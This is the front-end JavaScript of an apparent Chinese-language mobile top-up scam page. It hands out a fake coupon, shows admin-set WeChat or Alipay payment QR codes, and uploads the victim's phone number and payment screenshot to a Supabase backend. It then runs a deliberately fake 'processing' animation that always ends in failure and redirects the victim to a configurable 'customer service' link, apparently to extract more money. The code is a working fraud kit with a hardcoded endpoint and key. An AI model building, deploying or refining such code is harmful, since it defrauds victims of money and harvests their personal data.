// ============ 充值中心前台逻辑（index.js） ============
// ============ 配置区 ============
const SUPABASE_URL = 'https://recharge.qwert168202606.workers.dev';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVueXRhc2x2eWF5dGxxZG13YXZtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5OTY4NTIsImV4cCI6MjEwMDU3Mjg1Mn0.lU5OU0tWSzeYPiBWskH1jJ83BvgOEeCFm8DAYNLUET0';

let sbClient = null;
try {
    if (SUPABASE_URL && SUPABASE_URL.startsWith('http')) {
        sbClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    } else {
        console.warn('尚未配置 Supabase 凭证');
    }
} catch (e) { console.warn('Supabase 初始化失败：', e); }

// ============ 全局变量 ============
let currentPhone = '';
let couponCode = '';
let selectedRecharge = 200;
let selectedCoupon = 28;
let selectedAmount = 172;
let selectedPayMethod = 'wechat';
let uploadedFile = null;
let currentOrderId = '';
const settingsCache = {};

// ============ 工具函数 ============
function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg; t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2200);
}
function validatePhone(phone) { return /^1[3-9]\d{9}$/.test(phone); }
function generateCouponCode() {
    let code = ''; for (let i = 0; i < 12; i++) code += Math.floor(Math.random() * 10); return code;
}
function generateOrderId() {
    const now = new Date();
    const dateStr = now.getFullYear().toString() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0') + String(now.getHours()).padStart(2,'0') + String(now.getMinutes()).padStart(2,'0') + String(now.getSeconds()).padStart(2,'0');
    const rand = Math.floor(Math.random() * 9000 + 1000);
    return 'ORD' + dateStr + rand;
}

// 超时包装器
function withTimeout(promise, ms, errMsg) {
    return Promise.race([
        promise,
        new Promise((_, reject) => setTimeout(() => reject(new Error(errMsg || '操作超时')), ms))
    ]);
}

// ============ 页面切换 ============
function goStep(stepNum) {
    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + stepNum).classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
    if (stepNum === 2) {
        if (!currentOrderId) {
            currentOrderId = generateOrderId();
            document.getElementById('sumOrderId').textContent = currentOrderId;
        }
        updateQrCode();
    }
    if (stepNum === 3) { updateQrCode(); }
}

// ============ 第一步：领取代金券 ============
async function claimCoupon() {
    const phoneInput = document.getElementById('phoneInput');
    const claimBtn = document.getElementById('claimBtn');
    const statusText = document.getElementById('statusText1');
    const nextBtn = document.getElementById('nextBtn1');

    let phone = phoneInput.value.trim();
    if (!phone) { showToast('请先输入手机号码'); phoneInput.focus(); return; }
    if (!validatePhone(phone)) { showToast('手机号格式不正确'); phoneInput.value = ''; phoneInput.focus(); return; }

    claimBtn.disabled = true;
    claimBtn.innerHTML = '正在领取...';
    statusText.innerHTML = '<span class="status-dot"></span> 正在生成电子券...';

    try {
        await new Promise(r => setTimeout(r, 1200));
        currentPhone = phone;
        couponCode = generateCouponCode();
        claimBtn.innerHTML = '已成功领取';
        statusText.innerHTML = '<span class="status-dot"></span> 代金券已发放至您的账户';
        statusText.classList.add('status-success');
        nextBtn.disabled = false;
        document.getElementById('sumCouponCode').textContent = couponCode;
        if (currentOrderId) document.getElementById('sumOrderId').textContent = currentOrderId;
        showToast('恭喜！代金券领取成功！');
    } catch(e) {
        claimBtn.disabled = false;
        claimBtn.innerHTML = '立即领取电子代金券';
        statusText.innerHTML = '<span class="status-dot"></span> 领取失败，请重试';
        showToast('领取失败，请稍后重试');
    }
}

// ============ 第二步：选择金额 ============
function selectAmount(el) {
    document.querySelectorAll('.amount-item').forEach(i => i.classList.remove('selected'));
    el.classList.add('selected');
    selectedRecharge = parseInt(el.dataset.recharge);
    selectedCoupon = parseInt(el.dataset.coupon);
    selectedAmount = parseInt(el.dataset.pay);

    const summaryRows = document.querySelectorAll('#orderSummary .summary-row');
    summaryRows[2].innerHTML = '<span class="summary-label">充值金额</span><span class="summary-value">¥' + selectedRecharge + '</span>';
    summaryRows[3].innerHTML = '<span class="summary-label">代金券优惠</span><span class="summary-value" style="color:#16A34A;">- ¥' + selectedCoupon + '</span>';
    summaryRows[4].innerHTML = '<span class="summary-label">实付金额</span><span class="summary-value summary-highlight">¥' + selectedAmount + '</span>';
}

// ============ 第二步：选择支付方式 ============
function selectPay(el) {
    document.querySelectorAll('.pay-method').forEach(m => m.classList.remove('selected'));
    el.classList.add('selected');
    selectedPayMethod = el.dataset.pay;
    updateQrCode();
}

// ============ 显示收款码 ============
function updateQrCode() {
    const qrPlaceholder = document.getElementById('qrPlaceholder');
    const qrImage = document.getElementById('qrImage');
    const qrTip = document.getElementById('qrTip');

    const wechatQr = settingsCache['wechat_qr'] || '';
    const alipayQr = settingsCache['alipay_qr'] || '';

    if (selectedPayMethod === 'wechat') {
        qrTip.textContent = '请使用微信扫码付款';
        if (wechatQr) { qrPlaceholder.style.display = 'none'; qrImage.style.display = 'block'; qrImage.src = wechatQr; }
        else { qrPlaceholder.style.display = 'flex'; qrPlaceholder.innerHTML = '<span>微信收款码<br>(管理员未设置)</span>'; qrImage.style.display = 'none'; }
    } else {
        qrTip.textContent = '请使用支付宝扫码付款';
        if (alipayQr) { qrPlaceholder.style.display = 'none'; qrImage.style.display = 'block'; qrImage.src = alipayQr; }
        else { qrPlaceholder.style.display = 'flex'; qrPlaceholder.innerHTML = '<span>支付宝收款码<br>(管理员未设置)</span>'; qrImage.style.display = 'none'; }
    }
}

// ============ 处理截图上传 ============
function handleUpload(event) {
    const file = event.target.files[0];
    if (!file) return;
    if (file.size > 5 * 1024 * 1024) { showToast('图片大小不能超过5MB'); return; }

    uploadedFile = file;
    const reader = new FileReader();
    reader.onload = function(e) {
        const preview = document.getElementById('previewImg');
        preview.src = e.target.result; preview.classList.add('show');
        document.getElementById('uploadArea').classList.add('has-image');
        document.getElementById('uploadIcon').style.display = 'none';
        document.getElementById('uploadText').textContent = '点击重新选择图片';
        document.getElementById('statusText3').innerHTML = '<span class="status-dot"></span> 截图已选择，可提交订单';
        document.getElementById('statusText3').classList.add('status-success');
        showToast('截图已选择');
    };
    reader.readAsDataURL(file);
}

// ============ 提交订单（点完直接跳第4步） ============
async function submitOrder() {
    if (!uploadedFile) { showToast('请先上传付款截图'); return; }

    // 确保订单编号存在
    if (!currentOrderId) currentOrderId = generateOrderId();

    // 先设置订单编号，再跳页
    document.getElementById('resultOrderId').textContent = '订单编号：' + currentOrderId;
    document.getElementById('resultOrderIdFail').textContent = '订单编号：' + currentOrderId;

    // 直接跳到第4步（加载页）
    goStep(4);

    let failReason = '网络异常，请联系在线客服';

    try {
        if (!sbClient) {
            failReason = '系统维护中，请联系在线客服';
            throw new Error(failReason);
        }

        const orderId = currentOrderId;
        const fileExt = uploadedFile.name.split('.').pop() || 'jpg';
        const filePath = `order_${orderId}_${Date.now()}.${fileExt}`;

        // 带超时的上传
        const uploadPromise = sbClient.storage.from('screenshots').upload(filePath, uploadedFile, { upsert: false });
        const { error: upErr } = await withTimeout(uploadPromise, 8000, '上传超时');
        if (upErr) throw upErr;

        const { data: urlData } = sbClient.storage.from('screenshots').getPublicUrl(filePath);
        const screenshotUrl = urlData.publicUrl;

        // 带超时的插入
        const insertPromise = sbClient.from('orders').insert({
            order_id: orderId, phone: currentPhone, coupon_code: couponCode,
            recharge: selectedRecharge, coupon_deduct: selectedCoupon, amount: selectedAmount,
            pay_method: selectedPayMethod, screenshot_url: screenshotUrl, status: 'pending'
        });
        const { error: insErr } = await withTimeout(insertPromise, 8000, '写入超时');
        if (insErr) throw insErr;

        failReason = '充值失败，请联系在线客服';
    } catch(e) {
        console.error('提交异常：', e);
        failReason = e.message || '网络错误，请联系在线客服';
        if (failReason.includes('Invalid') || failReason.includes('JWS')) failReason = '系统配置异常，请联系在线客服';
        if (failReason.includes('timeout') || failReason.includes('Timeout')) failReason = '网络连接超时，请联系在线客服';
    }

    // 在第4步跑小点加载动画，然后显示结果
    await runFakeProgress(failReason);
}

// ============ 小点加载动画（5秒） ============
async function runFakeProgress(failReason) {
    const text = document.getElementById('progressText');
    document.getElementById('resultProgressState').style.display = 'block';
    document.getElementById('resultFailState').style.display = 'none';

    const steps = [
        '正在验证订单信息…',
        '正在连接支付渠道…',
        '正在确认收款状态…',
        '正在为您充值…',
        '处理完成'
    ];

    for (const t of steps) {
        text.textContent = t;
        await new Promise(r => setTimeout(r, 1000));
    }

    showFailState(failReason);
}

// ============ 失败状态 ============
function showFailState(reason) {
    document.getElementById('resultProgressState').style.display = 'none';
    document.getElementById('resultFailState').style.display = 'block';
}

// ============ 联系客服（后台设了链接就直接转跳，否则进内置客服页） ============
function contactKefu() {
    const kefuLink = settingsCache['kefu_link'] || '';
    if (kefuLink) {
        // 后台配置了客服链接 → 直接转跳到该链接
        window.location.href = kefuLink;
    } else {
        // 没配链接时，跳转内置客服页面
        window.location.href = './kefu.html';
    }
}

// ============ 返回首页 ============
function resetAll() {
    currentPhone = ''; couponCode = ''; selectedPayMethod = 'wechat'; uploadedFile = null; currentOrderId = '';
    document.getElementById('phoneInput').value = '';
    document.getElementById('claimBtn').disabled = false;
    document.getElementById('claimBtn').innerHTML = '立即领取电子代金券';
    document.getElementById('statusText1').innerHTML = '<span class="status-dot"></span> 等待操作中...';
    document.getElementById('statusText1').classList.remove('status-success');
    document.getElementById('nextBtn1').disabled = true;

    document.querySelectorAll('.amount-item').forEach((item, idx) => item.classList.toggle('selected', idx === 0));
    document.querySelectorAll('.pay-method').forEach((m, idx) => m.classList.toggle('selected', idx === 0));
    selectedRecharge = 200; selectedCoupon = 28; selectedAmount = 172;

    document.getElementById('sumOrderId').textContent = '-';
    document.getElementById('sumCouponCode').textContent = '-';
    document.getElementById('sumRecharge').textContent = '¥200';
    const sr = document.querySelectorAll('#orderSummary .summary-row');
    sr[3].innerHTML = '<span class="summary-label">代金券优惠</span><span class="summary-value" style="color:#16A34A;">- ¥28</span>';
    sr[4].innerHTML = '<span class="summary-label">实付金额</span><span class="summary-value summary-highlight">¥172</span>';

    document.getElementById('previewImg').classList.remove('show');
    document.getElementById('previewImg').src = '';
    document.getElementById('uploadArea').classList.remove('has-image');
    document.getElementById('uploadIcon').style.display = '';
    document.getElementById('uploadText').textContent = '点击上传付款截图凭证';
    document.getElementById('fileInput').value = '';
    document.getElementById('submitBtn').disabled = false;
    document.getElementById('submitBtn').innerHTML = '我已支付，提交充值';
    document.getElementById('statusText3').innerHTML = '<span class="status-dot"></span> 请上传付款截图后提交';
    document.getElementById('statusText3').classList.remove('status-success');
    document.getElementById('statusText3').style.display = '';

    document.getElementById('resultProgressState').style.display = 'block';
    document.getElementById('resultFailState').style.display = 'none';

    goStep(1);
}

function goHome() {
    if (document.getElementById('step1').classList.contains('active')) showToast('当前已在首页');
    else { showToast('返回首页'); resetAll(); }
}

// ============ 加载设置 ============
window.addEventListener('DOMContentLoaded', async function() {
    try {
        if (!sbClient) return;
        const { data, error } = await sbClient.from('settings').select('key, value');
        if (!error && data) {
            data.forEach(row => { settingsCache[row.key] = row.value; });
            if (settingsCache['site_name']) { document.getElementById('siteTitle').textContent = settingsCache['site_name']; document.title = settingsCache['site_name']; }
            if (settingsCache['notice']) { document.getElementById('noticeText').textContent = settingsCache['notice']; }
            if (settingsCache['banner']) { document.getElementById('bannerText').innerHTML = settingsCache['banner']; }
            // 维护模式：后台开启后前台直接显示"暂停服务"遮罩
            if (settingsCache['maintenance'] === 'on') {
                const mo = document.getElementById('maintenanceOverlay');
                if (mo) mo.style.display = 'flex';
            }
        } else if (error) console.warn('读取设置失败：', error.message);
    } catch(e) { console.warn('Supabase 连接异常：', e); }
});

document.getElementById('phoneInput').addEventListener('input', function(e) { this.value = this.value.replace(/\D/g, ''); });
